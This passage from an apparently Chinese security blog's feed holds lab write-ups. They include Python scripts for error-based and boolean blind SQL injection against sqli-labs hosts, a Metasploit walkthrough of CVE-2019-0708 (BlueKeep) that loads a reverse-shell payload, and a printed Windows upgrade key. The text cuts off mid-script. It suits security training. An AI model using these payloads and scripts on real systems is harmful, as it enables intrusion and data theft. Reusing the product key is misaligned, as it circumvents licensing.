    <content type="html"><![CDATA[<p>使用脚本批量去判断每个网站使用的数据库能使用的报错注入函数</p><a id="more"></a><p>在这里将每个网址和他对应的数据库用字典连接起来，方便输出时查看函数。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">banben = &#123;&quot;http://localhost/test/showNews/lib/xinwenmoreandpinglun.php?action=123&apos;&quot;:&quot;版本为mysql8.0&quot;,&quot;http://192.168.100.197/Less-2/?id=1&quot;:&quot;版本为mysql5.0&quot;,&quot;http://192.168.100.144/index.php?author=admin&apos;&quot;:&quot;版本为mariadb 5.5&quot;&#125;</span><br></pre></td></tr></table></figure><p>将常见的报错注入函数放入列表中方便遍历</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">li = [</span><br><span class="line">    &quot;and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a)&quot;,</span><br><span class="line">    &quot;and (extractvalue(1,concat(0x7e,(select user()),0x7e)))&quot;,</span><br><span class="line">    &quot;and (updatexml(1,concat(0x7e,(select user()),0x7e),1))&quot;,</span><br><span class="line">    &quot;and geometrycollection((select * from(select * from(select user())a)b))&quot;,</span><br><span class="line">    &quot;and multipoint((select * from(select * from(select user())a)b))&quot;,</span><br><span class="line">    &quot;and polygon((select * from(select * from(select user())a)b))&quot;,</span><br><span class="line">    &quot;and multipolygon((select * from(select * from(select user())a)b))&quot;,</span><br><span class="line">    &quot;and linestring((select * from(select * from(select user())a)b))&quot;,</span><br><span class="line">    &quot;and multilinestring((select * from(select * from(select user())a)b))&quot;,</span><br><span class="line">    &quot;and exp(~(select * from(select user())a))&quot;</span><br><span class="line">    ]</span><br></pre></td></tr></table></figure><p>使用root作为关键字判断网页是否有回显，如果有回显证明此报错注入函数有用。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@localhost</span><br></pre></td></tr></table></figure><p>总体代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"># coding=UTF-8</span><br><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">import sys</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding( &quot;utf-8&quot; )</span><br><span class="line"></span><br><span class="line">lists = [</span><br><span class="line">    &quot;http://localhost/test/showNews/lib/xinwenmoreandpinglun.php?action=123&apos;&quot;,</span><br><span class="line">    &quot;http://192.168.100.197/Less-5/?id=1&quot;,</span><br><span class="line">    &quot;http://192.168.100.144/index.php?author=admin&apos;&quot;</span><br><span class="line">         ]</span><br><span class="line">banben = &#123;&quot;http://localhost/test/showNews/lib/xinwenmoreandpinglun.php?action=123&apos;&quot;:&quot;版本为mysql8.0&quot;,&quot;http://192.168.100.197/Less-2/?id=1&quot;:&quot;版本为mysql5.0&quot;,&quot;http://192.168.100.144/index.php?author=admin&apos;&quot;:&quot;版本为mariadb 5.5&quot;&#125;</span><br><span class="line"></span><br><span class="line">print banben[&quot;http://localhost/test/showNews/lib/xinwenmoreandpinglun.php?action=123&apos;&quot;]</span><br><span class="line"></span><br><span class="line">li = [</span><br><span class="line">    &quot;and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a)&quot;,</span><br><span class="line">    &quot;and (extractvalue(1,concat(0x7e,(select user()),0x7e)))&quot;,</span><br><span class="line">    &quot;and (updatexml(1,concat(0x7e,(select user()),0x7e),1))&quot;,</span><br><span class="line">    &quot;and geometrycollection((select * from(select * from(select user())a)b))&quot;,</span><br><span class="line">    &quot;and multipoint((select * from(select * from(select user())a)b))&quot;,</span><br><span class="line">    &quot;and polygon((select * from(select * from(select user())a)b))&quot;,</span><br><span class="line">    &quot;and multipolygon((select * from(select * from(select user())a)b))&quot;,</span><br><span class="line">    &quot;and linestring((select * from(select * from(select user())a)b))&quot;,</span><br><span class="line">    &quot;and multilinestring((select * from(select * from(select user())a)b))&quot;,</span><br><span class="line">    &quot;and exp(~(select * from(select user())a))&quot;</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">for i in range(len(lists)):</span><br><span class="line">    url = lists[i]</span><br><span class="line">    print &quot;这时候测试的是&#123;&#125;&quot;.format(banben[url])</span><br><span class="line">    for j in range(len(li)):</span><br><span class="line">        yuju = lists[i]+ &quot; &quot; + format(li[j]) + &quot; -- |&quot;</span><br><span class="line">        shuju = requests.get(yuju)</span><br><span class="line">        r = r&apos;root@localhost&apos;</span><br><span class="line">        jieguo  = re.search(r,shuju.text)</span><br><span class="line"></span><br><span class="line">        if jieguo :</span><br><span class="line"></span><br><span class="line">            print li[j]</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;使用脚本批量去判断每个网站使用的数据库能使用的报错注入函数&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>CVE-2019-0708本地复现</title>
    <link href="https://0xxk.github.io/2019/09/07/CVE2019-0708%E6%9C%AC%E5%9C%B0%E5%A4%8D%E7%8E%B0/"/>
    <id>https://0xxk.github.io/2019/09/07/CVE2019-0708本地复现/</id>
    <published>2019-09-07T09:16:45.316Z</published>
    <updated>2019-09-07T16:25:53.531Z</updated>
    
    <content type="html"><![CDATA[<p>0708千呼万唤始出来，又将是一片腥风血雨</p><a id="more"></a><p><strong>CVE-2019-0708的危害性</strong></p><hr><p>Windows系列服务器于2019年5月15号，被爆出高危漏洞，该漏洞影响范围较广，windows2003、windows2008、windows2008 R2、windows xp * 系统都会遭到攻击，该服务器漏洞利用方式是通过远程桌面端口3389，RDP协议进行攻击的 。</p><hr><h1 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h1><p>首先搭建环境，我这里使用的是win7旗舰版（家庭版升级而来）,KALI自带的v5.0.45版本MSF。</p><h3 id="win7环境搭建"><a href="#win7环境搭建" class="headerlink" title="win7环境搭建"></a>win7环境搭建</h3><p>在VMware Fusion中安装windows7 SP1版本模拟受害机</p><p>Windows7 SP1下载连接:<code>ed2k://|file|cn_windows_7_ultimate_with_sp1_x64_dvd_u_677408.iso|3420557312|B58548681854236C7939003B583A8078|/</code></p><p>在VM14中安装完SP1后会是win7家庭版，需要使用升级。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.点击win图标</span><br><span class="line">2.然后找到并打开Windows Anytime Upgrade，进入下一步。</span><br><span class="line">3.在弹出的界面中选择“输入升级密钥”，进入下一步。</span><br><span class="line">4.然后输入RHTBY-VWY6D-QJRJ9-JGQ3X-Q2289，点击下一步继续</span><br></pre></td></tr></table></figure><p>在升级完之后就是win7旗舰版</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/images/CVE2019-系统版本.png" alt title>                </div>                <div class="image-caption"></div>            </figure><p>接下来进入控制面板的所有控制面板项中的系统，点击远程设置。在远程设置中勾选允许运行任意版本即可。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/images/CVE2019-0708-开启3389.png" alt title>                </div>                <div class="image-caption"></div>            </figure><h3 id="KALI环境搭建"><a href="#KALI环境搭建" class="headerlink" title="KALI环境搭建"></a>KALI环境搭建</h3><h4 id="更新MSF"><a href="#更新MSF" class="headerlink" title="更新MSF"></a>更新MSF</h4><p>首先要将MSF更新到最新版本，在最新版本中才会包括0708的利用模块。</p><p><strong>默认使用kali官方源来更新</strong></p><p>apt-get update</p><p>apt-get install metasploit-framework</p><p><strong>如果觉得官方源慢可以更换其他源</strong></p><p>用leafpad打开sources.list，把其他源加入进去。</p><p>leafpad /etc/apt/sources.list</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line"></span><br><span class="line">deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line"></span><br><span class="line">#阿里云kali更新源</span><br><span class="line"></span><br><span class="line">deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br><span class="line"></span><br><span class="line">deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br><span class="line"></span><br><span class="line">#163 DEBIAN源</span><br><span class="line"></span><br><span class="line">deb http://mirrors.163.com/debian wheezy main non-free contrib</span><br><span class="line"></span><br><span class="line">deb-src http://mirrors.163.com/debian wheezy main non-free contrib</span><br><span class="line"></span><br><span class="line">deb http://mirrors.163.com/debian wheezy-proposed-updates main non-free contrib</span><br><span class="line"></span><br><span class="line">deb-src http://mirrors.163.com/debian wheezy-proposed-updates main non-free contrib</span><br><span class="line"></span><br><span class="line">deb-src http://mirrors.163.com/debian-security wheezy/updates main non-free contrib</span><br></pre></td></tr></table></figure><h4 id="载入攻击模块"><a href="#载入攻击模块" class="headerlink" title="载入攻击模块"></a>载入攻击模块</h4><p>下载Reference中的攻击模块放入msf的响应文件夹中（如果已存在同名文件，直接覆盖即可。如没有则自己创建）</p><p>模块下载地址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">链接：https://pan.baidu.com/s/1vIlYYn9RlJ0KUMTzFhMsVQ </span><br><span class="line">提取码：ax18</span><br></pre></td></tr></table></figure><p>里面有四个攻击模块</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/images/CVE2019-0708-攻击模块.png" alt title>                </div>                <div class="image-caption"></div>            </figure><p>将攻击模块一一放入放入如下路径中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">rdp.rb -&gt; /usr/share/metasploit-framework/lib/msf/core/exploit/rdp.rb</span><br><span class="line">rdp_scanner.rb -&gt; /usr/share/metasploit-framework/modules/auxiliary/scanner/rdp/rdp_scanner.db</span><br><span class="line">cve_2019_0708_bluekeep.rb -&gt; /usr/share/metasploit-framework/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rb</span><br><span class="line">cve_2019_0708_bluekeep_rce.rb -&gt; /usr/share/metasploit-framework/modules/exploits/windows/rdp/cve_2019_0708_bluekeep_rce.rb</span><br></pre></td></tr></table></figure><h4 id="使用攻击命令"><a href="#使用攻击命令" class="headerlink" title="使用攻击命令"></a>使用攻击命令</h4><p>使用msfconsole命令进入metasploit-framework框架</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/images/CVE2019-0708进入MSF框架.png" alt title>                </div>                <div class="image-caption"></div>            </figure><p>进入以后使用reload_all重新加载0708rdp利用模块</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/images/CVE2019-0708-重新加载模块.png" alt title>                </div>                <div class="image-caption"></div>            </figure><p>使用use exploit/windows/rdp/cve_2019_0708_bluekeep_rce启用0708RDP攻击模块</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/images/CVE2019-0708进入攻击模块.png" alt title>                </div>                <div class="image-caption"></div>            </figure><p>使用info可以查看工具相关信息以及设置</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/images/CVE2019-0708-info查看命令.png" alt title>                </div>                <div class="image-caption"></div>            </figure><p>可以看到我们需要设置的选项主要为RHOSTS \ RPORT \ target</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">使用set RHOSTS 设置靶机IP</span><br><span class="line"></span><br><span class="line">使用set RPORT 设置靶机PORT</span><br><span class="line"></span><br><span class="line">使用set target ID数字（可选为1-4）每种都代表了机器架构</span><br></pre></td></tr></table></figure><p>在我的复现环境中使用target 3即可</p><p>目标靶机的IP为192.168.100.248</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/images/CVE2019-0708-查看靶机IP.png" alt title>                </div>                <div class="image-caption"></div>            </figure><p>接下来设置如下参数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">目标IP：set RHOSTS 192.168.100.248</span><br><span class="line"></span><br><span class="line">目标端口: set RPORT 3389</span><br><span class="line"></span><br><span class="line">架构id: set target 3</span><br><span class="line"></span><br><span class="line">载入playload: set payload generic/shell_reverse_tcp</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/images/CVE2019-0708-查看参数.png" alt title>                </div>                <div class="image-caption"></div>            </figure><p>设置完参数之后，使用run开启攻击。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/images/CVE2019-0708run执行.png" alt title>                </div>                <div class="image-caption"></div>            </figure><p>可以看到反弹成功了，ip为目标机IP</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/images/CVE2019-0708查看ip.png" alt title>                </div>                <div class="image-caption"></div>            </figure><p>参考链接</p><p><a href="https://jingyan.baidu.com/article/63f23628177e6d0209ab3d60.html" target="_blank" rel="noopener">win7开启远程桌面</a></p><p><a href="https://www.cnblogs.com/zuoxiaolongzzz/p/8927173.html" target="_blank" rel="noopener">kali 更新msf</a></p><p><a href="https://qiita.com/shimizukawasaki/items/024b296a4c9ae7c33961?from=groupmessage" target="_blank" rel="noopener">CVE-2019-0708远程桌面代码执行漏洞复现</a></p><p><a href="https://github.com/rapid7/metasploit-framework/pull/12283/files" target="_blank" rel="noopener">添加CVE-2019-0708</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;0708千呼万唤始出来，又将是一片腥风血雨&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>python脚本之盲注脚本</title>
    <link href="https://0xxk.github.io/2019/09/01/python%E8%84%9A%E6%9C%AC%E4%B9%8B%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/"/>
    <id>https://0xxk.github.io/2019/09/01/python脚本之布尔盲注/</id>
    <published>2019-09-01T09:38:37.702Z</published>
    <updated>2019-09-07T16:06:08.135Z</updated>
    
    <content type="html"><![CDATA[<p>利用脚本去代替人工查询盲注</p><a id="more"></a><p>本脚本只针对mysql-sqli注入实验室中的GET型盲注有用，且需要手动判断截断字符。</p><p>查库的数据AND查表的数据AND查字段的数据，根本上都是进行了三部，首先查行数，再查每行字符数，最后查每行的单个数据。所以先要针对这三部分的代码进行编写。</p><p>查看行数的代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">def chahangshu(url,url1,url2,url3):</span><br><span class="line">    global jieduan</span><br><span class="line">    print url1,url2,url3</span><br><span class="line">    url = url + &quot;&#123;&#125; &quot;.format(jieduan[0])+ &quot;and (&quot; + url1 + &quot; count(&#123;&#125;) &quot;.format(url2)+ url3 + &quot;)&quot;</span><br><span class="line">    print url</span><br><span class="line">    for i in range(0,29):</span><br><span class="line">        url_i1 = url + &quot; &gt; &#123;&#125;&quot;.format(i) + &quot; &#123;&#125;&quot;.format(jieduan[1])</span><br><span class="line">        url_i2 = url + &quot; &gt; &#123;&#125;&quot;.format(i+1) + &quot; &#123;&#125;&quot;.format(jieduan[1])</span><br><span class="line">        jieguo = qingqiu(url_i1,url_i2)</span><br><span class="line">        if jieguo:</span><br><span class="line">            return i+1</span><br></pre></td></tr></table></figure><p>查看每行字符数的代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">def chazifushu(url,url_chashuzi,hangshu):</span><br><span class="line">    global jieduan</span><br><span class="line">    url1 = url + jieduan[0] + &quot; and length((&quot; + url_chashuzi</span><br><span class="line">    list = []</span><br><span class="line">    for i in range(hangshu):</span><br><span class="line">        url2 = url1 + &quot; limit &#123;&#125;,1&quot;.format(i) + &quot;))&quot;</span><br><span class="line">        for j in range(0,50):</span><br><span class="line">            url3_1 = url2 + &quot; &gt; &#123;&#125; &quot;.format(j) + jieduan[1]</span><br><span class="line">            url3_2 = url2 + &quot; &gt; &#123;&#125; &quot;.format(j+1) + jieduan[1]</span><br><span class="line">            jieguo = qingqiu(url3_1, url3_2)</span><br><span class="line">            if jieguo:</span><br><span class="line">                print &quot;第&#123;&#125;行字符长度为：&#123;&#125;字符&quot;.format(i+1,j+1)</span><br><span class="line">                list.append(j+1)</span><br><span class="line">                break</span><br><span class="line">    return list</span><br></pre></td></tr></table></figure><p>查看每行的单个字符数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">def chashuzhi(url,url_chashuzi,hangshu,zifushu):</span><br><span class="line">    global jieduan</span><br><span class="line"></span><br><span class="line">    list = []</span><br><span class="line">    qingqiuURL = url + jieduan[0] + &quot; and ascii(mid((&quot; + url_chashuzi</span><br><span class="line">    for i in range(hangshu):</span><br><span class="line">        qingqiuURLi = qingqiuURL + &quot; limit &#123;&#125;,1&quot;.format(i) + &quot;),&quot;</span><br><span class="line">        flag = &quot;&quot;</span><br><span class="line">        for j in range(zifushu[i]):</span><br><span class="line">            qingqiuURLj = qingqiuURLi + &quot;&#123;&#125;,1)) &gt; &quot;.format(j+1)</span><br><span class="line">            for m in range(33,127):</span><br><span class="line">                qingqiuURLm1 = qingqiuURLj + &quot; &#123;&#125; &quot;.format(m) + jieduan[1]</span><br><span class="line">                qingqiuURLm2 = qingqiuURLj + &quot; &#123;&#125; &quot;.format(m+1) + jieduan[1]</span><br><span class="line">                jieguo = qingqiu(qingqiuURLm1,qingqiuURLm2)</span><br><span class="line">                if jieguo:</span><br><span class="line">                    print chr(m+1),</span><br><span class="line">                    flag+= chr(m+1)</span><br><span class="line">                    break</span><br><span class="line">                    print flag</span><br><span class="line"></span><br><span class="line">        list.append(flag)</span><br><span class="line">        print list</span><br><span class="line"></span><br><span class="line">    return list</span><br></pre></td></tr></table></figure><p>接下来就是数据库调用、数据表调用、字符调用的函数了。</p><p>数据库调用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">def chaschema_name(url):</span><br><span class="line">    url_schema1 = &quot;select&quot;</span><br><span class="line">    url_schema2 = &quot;schema_name&quot;</span><br><span class="line">    url_schema3 = &quot;from information_schema.schemata&quot;</span><br><span class="line">    url_schema = url_schema1 + &quot; &quot;+ url_schema2 + &quot; &quot; + url_schema3</span><br><span class="line">    hangshu = chahangshu(url,url_schema1,url_schema2,url_schema3)</span><br><span class="line">    print &quot;一共有&#123;&#125;个数据库&quot;.format(hangshu)</span><br><span class="line">    zifushu = chazifushu(url, url_schema, hangshu)</span><br><span class="line">    print zifushu</span><br><span class="line"></span><br><span class="line">    listhang = chashuzhi(url,url_schema,hangshu,zifushu)</span><br><span class="line">    print listhang</span><br><span class="line">    return listhang</span><br></pre></td></tr></table></figure><p>数据表调用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">def chatable_name(url,schema_name):</span><br><span class="line">    url_table1 = &quot;select&quot;</span><br><span class="line">    url_table2 = &quot;table_name&quot;</span><br><span class="line">    url_table3 = &quot;from information_schema.tables where table_schema = &apos;&#123;&#125;&apos;&quot;.format(schema_name)</span><br><span class="line">    url_table = url_table1 + &quot; &quot; + url_table2 + &quot; &quot; + url_table3</span><br><span class="line">    hangshu = chahangshu(url, url_table1, url_table2, url_table3)</span><br><span class="line">    print &quot;&#123;&#125;库一共有&#123;&#125;张表&quot;.format(schema_name,hangshu)</span><br><span class="line">    zifushu = chazifushu(url, url_table, hangshu)</span><br><span class="line">    print zifushu</span><br><span class="line">    listhang = chashuzhi(url, url_table, hangshu, zifushu)</span><br><span class="line">    print &quot;------&quot;</span><br><span class="line">    print listhang</span><br><span class="line">    print &quot;------&quot;</span><br><span class="line">    return listhang</span><br></pre></td></tr></table></figure><p>字符调用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">def chacolumn_name(url,schema_name,table_name):</span><br><span class="line">    url_column1 = &quot;select&quot;</span><br><span class="line">    url_column2 = &quot;column_name&quot;</span><br><span class="line">    url_column3 = &quot;from information_schema.columns where table_schema = &apos;&#123;&#125;&apos; and table_name = &apos;&#123;&#125;&apos;&quot;.format(schema_name,table_name)</span><br><span class="line">    url_column = url_column1 + &quot; &quot; + url_column2 + &quot; &quot; + url_column3</span><br><span class="line">    # print url_column</span><br><span class="line">    hangshu = chahangshu(url, url_column1, url_column2, url_column3)</span><br><span class="line">    print &quot;&#123;&#125;表一共有&#123;&#125;个字段&quot;.format(table_name,hangshu)</span><br><span class="line">    zifushu = chazifushu(url, url_column, hangshu)</span><br><span class="line">    print &quot;***&quot;</span><br><span class="line">    print zifushu</span><br><span class="line">    listhang = chashuzhi(url, url_column, hangshu, zifushu)</span><br><span class="line">    print &quot;------&quot;</span><br><span class="line">    print listhang</span><br><span class="line">    print &quot;------&quot;</span><br><span class="line">    return listhang</span><br></pre></td></tr></table></figure><p>最后就是当数据库名称，表明称和字段名称都查出来后。总的查询数据的操作：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">def cha_shuju(url, schema_name,table_name,column_name):</span><br><span class="line">    url_shuzhi1 = &quot;select&quot;</span><br><span class="line">    url_shuzhi2 = &quot;&#123;&#125;&quot;.format(column_name)</span><br><span class="line">    url_shuzhi3 = &quot;from &#123;&#125;.&#123;&#125;&quot;.format(schema_name,table_name)</span><br><span class="line"></span><br><span class="line">    url_shuzhi = url_shuzhi1 + &quot; &quot; + url_shuzhi2 + &quot; &quot; + url_shuzhi3</span><br><span class="line">    hangshu = chahangshu(url, url_shuzhi1, url_shuzhi2, url_shuzhi3)</span><br><span class="line">    print &quot;&#123;&#125;库&#123;&#125;表&#123;&#125;字段一共有&#123;&#125;行&quot;.format(schema_name,table_name,column_name, hangshu)</span><br><span class="line">    zifushu = chazifushu(url, url_shuzhi, hangshu)</span><br><span class="line">    print &quot;***&quot;</span><br><span class="line">    print zifushu</span><br><span class="line">    listhang = chashuzhi(url, url_shuzhi, hangshu, zifushu)</span><br><span class="line">    print &quot;------&quot;</span><br><span class="line">    print listhang</span><br><span class="line">    print &quot;------&quot;</span><br><span class="line">    return listhang</span><br></pre></td></tr></table></figure><p>接下来就是中央枢纽：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">def main():</span><br><span class="line">    global zifu,jieduan</span><br><span class="line">    jieduan = [&apos;\&apos;&apos;,&apos;-- |&apos;]</span><br><span class="line">    url = &quot;http://192.168.107.128/sqli/Less-8/?id=1&quot;</span><br><span class="line">    schema_name = chaschema_name(url)</span><br><span class="line">    print &quot;一共有如下表&#123;&#125;&quot;.format(schema_name)</span><br><span class="line">    zhiding_schema = raw_input(&quot;请输入要查询的库名&quot;)</span><br><span class="line"></span><br><span class="line">    i =1</span><br><span class="line">    while (i):</span><br><span class="line">        for i in schema_name:</span><br><span class="line">            print i,zhiding_schema</span><br><span class="line">            if zhiding_schema == i:</span><br><span class="line">                table_name = chatable_name(url, zhiding_schema)</span><br><span class="line">                print &quot;&#123;&#125;库有如下表&#123;&#125;&quot;.format(zhiding_schema,table_name)</span><br><span class="line">                i =0</span><br><span class="line">                break</span><br><span class="line">        if(i ==1):</span><br><span class="line">            zhiding_schema = input(&quot;不存在此库，请检查是否输入错误&quot;)</span><br><span class="line"></span><br><span class="line">    zhiding_table = raw_input(&quot;请输入要查询的表名&quot;)</span><br><span class="line">    # # print zhiding_table</span><br><span class="line">    # table_name = [&apos;emails&apos;, &apos;referers&apos;, &apos;uagents&apos;, &apos;users&apos;]</span><br><span class="line">    # zhiding_table = &quot;emails&quot;</span><br><span class="line">    i = 1</span><br><span class="line">    while (i):</span><br><span class="line">        for i in table_name:</span><br><span class="line">            print i, zhiding_table</span><br><span class="line">            if zhiding_table == i:</span><br><span class="line">                columns_name = chacolumn_name(url, zhiding_schema,zhiding_table)</span><br><span class="line">                i = 